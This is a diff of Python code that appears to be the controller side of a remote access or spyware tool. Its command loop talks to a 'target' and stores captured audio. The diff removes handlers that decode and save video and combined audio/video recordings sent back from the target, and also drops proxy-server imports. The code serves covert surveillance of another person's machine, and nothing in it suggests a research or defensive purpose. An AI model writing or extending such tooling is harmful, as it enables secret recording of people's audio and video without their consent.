@@ -6,8 +6,6 @@
 # Import necessary libraries
 import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
-import threading  # For proxy server
-import os  # For file operations
 
 # Import configuration
 from configuration import SERVER_IP, SERVER_PORT
@@ -195,59 +193,6 @@ def target_communication():
                     print(f"Audio saved to: {audio_path} ({result['size']} bytes)")
                 else:
                     print(f"Audio: {result}")
-            elif command == 'stop_video':
-                if isinstance(result, dict) and result.get('action') == 'video':
-                    # Save video file to server
-                    import base64
-                    import os
-                    
-                    recordings_dir = "recordings"
-                    if not os.path.exists(recordings_dir):
-                        os.makedirs(recordings_dir)
-                    
-                    video_data = base64.b64decode(result['data'])
-                    video_path = os.path.join(recordings_dir, result['filename'])
-                    
-                    with open(video_path, 'wb') as f:
-                        f.write(video_data)
-                    
-                    print(f"Video saved to: {video_path} ({result['size']} bytes)")
-                else:
-                    print(f"Video: {result}")
-            elif command == 'stop_recording':
-                if isinstance(result, dict) and result.get('action') == 'recording':
-                    # Save audio and video files to server
-                    import base64
-                    import os
-                    
-                    recordings_dir = "recordings"
-                    if not os.path.exists(recordings_dir):
-                        os.makedirs(recordings_dir)
-                    
-                    saved_files = []
-                    
-                    # Save audio if available
-                    if result.get('audio_data'):
-                        audio_data = base64.b64decode(result['audio_data'])
-                        audio_path = os.path.join(recordings_dir, result['audio_filename'])
-                        with open(audio_path, 'wb') as f:
-                            f.write(audio_data)
-                        saved_files.append(f"Audio: {audio_path} ({result['audio_size']} bytes)")
-                    
-                    # Save video if available
-                    if result.get('video_data'):
-                        video_data = base64.b64decode(result['video_data'])
-                        video_path = os.path.join(recordings_dir, result['video_filename'])
-                        with open(video_path, 'wb') as f:
-                            f.write(video_data)
-                        saved_files.append(f"Video: {video_path} ({result['video_size']} bytes)")
-                    
-                    if saved_files:
-                        print(f"Recording files saved:\n" + "\n".join(saved_files))
-                    else:
-                        print("No recording data received")
-                else:
-                    print(f"Recording: {result}")
             elif command == 'list_recordings':
                 # List recordings from server directory
                 import os
